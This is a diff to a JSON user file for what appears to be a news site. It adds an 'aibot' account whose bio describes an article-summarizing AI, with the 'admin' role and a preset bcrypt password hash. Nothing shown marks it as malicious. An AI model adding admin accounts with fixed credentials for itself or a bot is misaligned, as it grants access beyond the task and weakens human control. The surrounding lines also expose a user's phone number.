@@ -94,5 +94,17 @@
     "address": "Đà Nẵng",
     "updatedAt": "2025-12-25T09:36:53.612Z",
     "phone": "0908737813"
+  },
+  {
+    "id": 999,
+    "username": "aibot",
+    "useremail": "ai@newsjco.com",
+    "displayName": "AI Bot",
+    "avatar": "https://api.dicebear.com/7.x/bottts/svg?seed=ai",
+    "role": "admin",
+    "password": "$2b$10$K5/9Gh6cPZVfK9kY0C8BreyEQvFXi1dN/JzGEp5WOO0J1Z0Q8XcXm",
+    "bio": "I am an AI assistant here to help summarize articles.",
+    "createdAt": "2025-01-01T00:00:00+07:00",
+    "updatedAt": "2025-01-01T00:00:00+07:00"
   }
 ]
